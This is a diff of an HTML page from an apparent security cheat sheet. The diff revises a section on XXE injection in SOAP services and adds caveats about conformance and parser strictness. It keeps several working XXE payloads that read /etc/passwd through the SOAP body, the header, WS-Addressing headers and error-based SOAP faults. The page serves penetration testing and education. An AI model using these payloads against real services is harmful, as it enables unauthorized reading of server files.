@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=8c2515b">
+  <link rel="stylesheet" href="/assets/style.css?v=89e4f13">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -1205,7 +1205,8 @@ cd ..</code></pre>
 <h3 id="general-strategy">General strategy</h3>
 <p>The approach is the same for all XML-based formats (SVG, XLSX, DOCX, ODS, ODP, XML, XHTML): include a basic entity, upload, check output. If output is not reflected use blind XXE. Some servers validate MIME types so you may need to craft polyglot files.</p>
 <h2 id="xxe-in-soap">XXE in SOAP</h2>
-<p>SOAP is built on XML and remains widely used in enterprise systems (financial, government). Since SOAP inherently consumes XML, it is a natural target for XXE. Note that many SOAP frameworks parse XML at the framework level, so XXE exploitability depends on the framework's parser configuration, not just the application code.</p>
+<p>SOAP is built on XML and remains widely used in enterprise systems (financial, government, healthcare). Because SOAP messages are XML documents, SOAP endpoints are often treated as natural candidates for XXE testing. However, the important distinction is that XXE in SOAP is not really a SOAP feature — it is a consequence of how the underlying XML parser or SOAP framework handles untrusted XML.</p>
+<p>In practice, XXE exploitability in SOAP depends on whether the framework accepts DTDs, whether external entities are enabled, and at what stage parsing happens relative to schema or message validation. This is why SOAP XXE is often highly implementation-dependent: two services using the same WSDL may behave very differently depending on the XML stack behind them.</p>
 <p>A typical SOAP request:</p>
 <pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
@@ -1217,7 +1218,11 @@ cd ..</code></pre>
     &lt;/GetUser&gt;
   &lt;/soap:Body&gt;
 &lt;/soap:Envelope&gt;</code></pre>
+<h5 id="a-note-on-soap-conformance">A Note on SOAP Conformance</h5>
+<p>There is one important caveat before moving into payloads: modern SOAP specifications do not treat DOCTYPE declarations as valid SOAP message content. In strict SOAP implementations, a message containing a DTD may be rejected before any entity resolution takes place.</p>
+<p>That said, real-world systems do not always behave like strict specifications. Legacy SOAP stacks, permissive middleware, custom XML handlers and integrations that parse XML before SOAP-level validation may still process these payloads. For this reason, SOAP remains relevant during XXE testing even though the standard itself is restrictive.</p>
 <h3 id="injection-in-the-soap-body">Injection in the SOAP Body</h3>
+<p>If entity expansion happens before the service validates the message structure, the SOAP body can act as an injection sink just like any other XML element:</p>
 <pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE soap:Envelope [
   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
@@ -1229,8 +1234,9 @@ cd ..</code></pre>
     &lt;/GetUser&gt;
   &lt;/soap:Body&gt;
 &lt;/soap:Envelope&gt;</code></pre>
+<p>As with other XXE scenarios, success depends on the parser resolving the external entity before the application rejects the message for semantic reasons.</p>
 <h3 id="injection-in-the-soap-header">Injection in the SOAP Header</h3>
-<p>The header is also parsed and can be used as injection point:</p>
+<p>The header is also parsed and can therefore become an injection point in implementations that process the full XML document before applying SOAP-specific validation:</p>
 <pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE soap:Envelope [
   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
@@ -1247,9 +1253,10 @@ cd ..</code></pre>
     &lt;/GetUser&gt;
   &lt;/soap:Body&gt;
 &lt;/soap:Envelope&gt;</code></pre>
+<p>In practice, header-based injection is useful when the application ignores the body content on malformed requests but still parses the envelope and header blocks first.</p>
 <h3 id="soap-fault-based-exfiltration">SOAP Fault-Based Exfiltration</h3>
-<p>SOAP returns SOAP Fault messages on errors which are useful for blind XXE:</p>
-<pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+<p>SOAP services often return structured fault messages when parsing fails. In environments where errors are exposed, this can provide a blind exfiltration channel in the same way as error-based XXE in regular XML endpoints:</p>
+<p><pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE soap:Envelope [
   &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
   &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/&amp;#x25;file;'&gt;"&gt;
@@ -1263,11 +1270,12 @@ cd ..</code></pre>
     &lt;/GetUser&gt;
   &lt;/soap:Body&gt;
 &lt;/soap:Envelope&gt;</code></pre>
+If the parser attempts to resolve the invalid path, the resulting SOAP fault or backend error may include the expanded file contents.</p>
 <h5 id="a-note-on-parser-strictness-again">⚠️ A Note on Parser Strictness (again)</h5>
 <p>While the payload above is logically correct, it often fails in modern production environments. This is because the W3C XML Specification forbids the expansion of parameter entities (like <code>%eval;</code>) within the internal DTD subset (the part inside the <code>[...]</code> brackets) if they are used to define other markup.</p>
 <p>Many modern, spec-compliant parsers (like those in Java, .NET, or Libxml2) will throw an error as soon as they see %eval; used this way. If your payload is rejected with a <code>Parameter entity references are not allowed in internal DTD subsets</code> error, you will need to use other techniques (like OOB exfiltration) to successfully read the file contents.</p>
 <h3 id="ws-addressing">WS-Addressing</h3>
-<p>Some SOAP services use WS-Addressing headers which provide another injection point:</p>
+<p>Some SOAP services use WS-Addressing headers, which can provide another injection location if the full document is parsed before semantic validation:</p>
 <pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE soap:Envelope [
   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
@@ -1285,6 +1293,9 @@ cd ..</code></pre>
     &lt;/GetUser&gt;
   &lt;/soap:Body&gt;
 &lt;/soap:Envelope&gt;</code></pre>
+<p>This should be understood as an injection point, not as a WS-Addressing-specific XXE primitive. In other words, the risk still comes from insecure XML parsing, not from WS-Addressing itself. Also note that elements like wsa:Address are expected to contain URIs, so even if entity resolution occurs, the message may later fail SOAP or WS-Addressing validation. For that reason, WS-Addressing headers are best treated as context-dependent sinks rather than universally reliable XXE vectors.</p>
+<h4 id="practical-takeaway">Practical Takeaway</h4>
+<p>SOAP XXE is best approached as an implementation problem, not a protocol guarantee. The standard itself is restrictive, but real deployments often include legacy libraries, XML middleware, schema validators, security gateways and custom integrations that change how messages are parsed. From a testing perspective, this means SOAP remains worth checking — especially in enterprise environments — but success is far more dependent on the XML stack than on the SOAP envelope itself.</p>
 <h2 id="xxe-via-xinclude">XXE via XInclude</h2>
 <p>XInclude is an XML specification that allows including external XML documents without requiring a DOCTYPE declaration. This can bypass protections that specifically disable DOCTYPE processing.</p>
 <p>XInclude uses <code>&lt;xi:include&gt;</code> to reference external files:</p>
@@ -1962,6 +1973,6 @@ ruby server.rb</code></pre>
       });
     });
   </script>
-  <script src="/assets/main.js?v=8c2515b" defer></script>
+  <script src="/assets/main.js?v=89e4f13" defer></script>
 </body>
 </html>
